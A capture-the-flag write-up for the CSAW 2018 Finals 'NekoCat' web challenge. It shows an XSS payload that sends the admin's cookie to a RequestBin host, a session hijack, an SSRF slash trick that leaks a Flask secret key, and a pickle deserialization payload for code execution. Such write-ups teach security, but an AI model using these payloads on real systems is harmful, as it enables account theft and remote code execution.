> Flag is in /flag.txt
> 
> http://web.chal.csaw.io:1003
> 
> Files
> 
> [flagon.zip](https://ctf.csaw.io/files/5d0977e48372db7e81cbf84752a4c511/flagon.zip)

The website is similar to twitter, where users can create and send posts about whatever they want, and everyone else can see them in one complete feed. 

![Imgur](https://i.imgur.com/KoROMvT.png)

Looking at the zip, we see it's the complete source code of the website, and that it's running the Flask web framework. We see some interesting information in [flagon.py](https://github.com/DDOS-Attacks/ctf-writeups/blob/master/2018/CSAW%20CTF%202018%20Finals/Web/NekoCat/flagon/flagon.py):

```python
SECRET_KEY = os.environ.get("FLAGON_SECRET_KEY", "")

...

class Request(BaseRequest):
    @cached_property
    def session(self):
        data = self.cookies.get("session_data")
        if not data:
            return SecureCookie(secret_key=SECRET_KEY)
        return SecureCookie.unserialize(data, SECRET_KEY)
```
The application has a `SECRET_KEY` that it uses to create SecureCookie's. The first thing we need to do is figure out how to get the `SECRET_KEY` so we can sign our own cookies. Once we can sign our own cookies, we can utilize an RCE to get the flag. Because SecureCookie uses [pickle](https://docs.python.org/3/library/pickle.html) by default for serialization, we can exploit the deserialization to execute python code. For more information about python pickle deserialization vulnerabilities, you can visit this [link](https://crowdshield.com/blog.php?name=exploiting-python-deserialization-vulnerabilities).

```python
def flagoninfo(request):
    if request.remote_addr != "127.0.0.1":
        return render_template("404.html")

    info = {
        "system": " ".join(os.uname()),
        "env": str(os.environ)
    }

    return render_template("flaginfo.html", info_dict=info)

class Flagon(object):
    def __init__(self, name):
        self.name = name
        self.url_map = Map([])

        self.routes = {}
        self.wsgi_app = SharedDataMiddleware(self.wsgi_app, {
            '/static': os.path.join(os.getcwd(), 'static')
        })

        flaginfo_route = "/flaginfo"
        self.routes[flaginfo_route] = flagoninfo
        self.url_map.add(Rule(flaginfo_route, endpoint=flaginfo_route))
````
In order to get the value of SECRET_KEY, we have to be able to access http://web.chal.csaw.io:1003/flaginfo. Trying to directly access it returns a 404, which makes sense because according to the source code, we can only view the webpage if our ip address is `127.0.0.1` or localhost. Obviously we aren't localhost, so we need to find a different approach.

In [app.py](https://github.com/DDOS-Attacks/ctf-writeups/blob/master/2018/CSAW%20CTF%202018%20Finals/Web/NekoCat/app.py), we see the following:

```python
@app.route('/report')
@apply_csp
def report(request):
    #: neko checks for naughtiness
    #: neko likes links
    pass
```

This implies that there's some "admin" that automatically will click on any links we have in our post. With these type of problems, you normally want to exploit some type of XSS vulnerability so you can steal an admin's cookies. Normally with XSS vulnerability, you have to be able to inject some javascript into an html tag, but in this question we can only control a link. However, if we look at the csp, there's a way to achieve XSS with only a link:

```python
def apply_csp(f):
    @wraps(f)
    def decorated_func(*args, **kwargs):
        resp = f(*args, **kwargs)
        csp = "; ".join([
                "default-src 'self' 'unsafe-inline'",
                "style-src " + " ".join(["'self'",
                                         "*.bootstrapcdn.com",
                                         "use.fontawesome.com"]),
                "font-src " + "use.fontawesome.com",
                "script-src " + " ".join(["'unsafe-inline'",
                                          "'self'",
                                          "cdnjs.cloudflare.com",
                                          "*.bootstrapcdn.com",
                                          "code.jquery.com"]),
                "connect-src " + "*"
              ])
        resp.headers["Content-Security-Policy"] = csp

        return resp
    return decorated_func
```

For `script-src`, we see that `unsafe-inline` is allowed. Looking at [this](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src) link, it explains what `unsafe-inline` means:

```
'unsafe-inline'
Allows the use of inline resources, such as inline <script> elements, javascript: URLs, inline event handlers, and inline <style> elements. You must include the single quotes.
```

We can use `javascript:` URLs to leverage XSS! A `javascript:` URL will allow us to execute javascript, so we can obtain the admin's cookies. For example if our url was this:

```javascript
javascript:document.location='http://www.google.com/'
```

And the admin clicks on that link, then he would be redirected to www.google.com! Now we construct our own link to steal the admin's cookies. The payload is as follows:

```javascript
javascript:document.location="http://requestbin.fullcontact.com/zfbxyqzf?"+document.cookie
```

![Imgur](https://i.imgur.com/JKVQiIv.png)

RequestBin is a simple site to log HTTP requests, so we can use the service to log the request the admin makes when he clicks on the link, to steal his cookies. AFter creating our post, all we need to do is click on the report link and watch the magic happen.

![Imgur](https://i.imgur.com/KEb29NL.png)

We have successfully obtained the admin's cookies, but what do we do with this now? Also take note of the value of the `Referer` header:

```
Referer: http://127.0.0.1:5000/post?id=20809&instance=cf665777-b943-42ad-bf5e-332f8fc7d2ed
```

The ip address is `127.0.0.1`! This means the admin is running localhost, so we can abuse this to access `/flaginfo`! Looking at [app.py](https://github.com/DDOS-Attacks/ctf-writeups/blob/master/2018/CSAW%20CTF%202018%20Finals/Web/NekoCat/app.py) again:

```python
def get_post_preview(url):
    scheme, netloc, path, query, fragment = url_parse(url)

    # No oranges allowed
    if scheme != 'http' and scheme != 'https':
        return None

    if '..' in path:
        return None

    if path.startswith('/flaginfo'):
        return None

    try:
        r = requests.get(url, allow_redirects=False)
    except Exception:
        return None

    soup = BeautifulSoup(r.text, 'html.parser')
    if soup.body:
        result = ''.join(soup.body.findAll(text=True)).strip()
        result = ' '.join(result.split())
        return result[:280]

    return None
```

Using the `get_post_preview` function, if the link is `http://127.0.0.1:5000/flaginfo`, then we can access the value of `SECRET_KEY`! However looking at the `newpost` function:

```python
@app.route('/newpost')
@login_required
@apply_csp
def newpost(request):
    post = request.form.get('submission-text')
    if (len(post) > 280):
        return redirect('/')

    preview = None
    link = None

    for word in post.split(' '):
        if word.startswith('[link]'):
            link = " ".join(word.split('[link]')[1:]).strip()
            if verified_user(session, request.session.get('username'))[0]:
                preview = get_post_preview(link)
            link = link
            break

    post = post.replace('[link]', '')

    add_post(session, request.session.get('username'), post, link, preview)

    return redirect('/')
```

It seems we have to be a `verified_user` in order to use the `get_post_preview` function. Thankfully, the admin is a verified user! Using the admin's cookies we just stole, we can login as admin and then make a post with the `/flaginfo` link and obtain the value of `SECRET_KEY`. Using the cookie value we had before:

```
session_data="/V38m03gQsL5Q3kswHnyy6dDHUM=?name=gANYCAAAAE5la28gQ2F0cQAu&username=gANYDQAAAG1lb3dfY2Y2NjU3NzdxAC4="
```

We can replace the current value of our `session_data` cookie with this value, and if we reload the page, we're logged in as the admin!

![Imgur](https://i.imgur.com/CFpWEz8.png)

Now we create a post with `http://127.0.0.1:5000///flaginfo` and obtain the value of `SECRET_KEY`. Why are there 3 slashes instead of one in our URL? Because of this check:

```python
if path.startswith('/flaginfo'):
    return None
```

The `path` variable will contain the part of our URL after `http://127.0.0.1:5000`, therefore by injecting more slashes than one, we don't change the actual URL when it's resolved, but it will change the value of `path` when parsing our URL so we can bypass the check. (Theoretically 2 slashes should work, but for some reason I had success with 3 and not 2).

![Imgur](https://i.imgur.com/gOfFJsJ.png)

With our newly created post, we have obtained the value of `SECRET_KEY` as `superdupersecretflagonkey`. We can now sign our own cookies and do on RCE to get our flag. To generate the cookie, we will use this code (note the `username` is the username of the admin that we are logged in as):

```python
import subprocess
from werkzeug.contrib.securecookie import SecureCookie

class a(object):
    def __reduce__(self):
        return (subprocess.check_output, (['cat', 'flag.txt']))

SECRET_KEY = 'superdupersecretflagonkey'

print(SecureCookie({'name':a(), 'username':'meow_cf665777'}, SECRET_KEY).serialize())
```
```
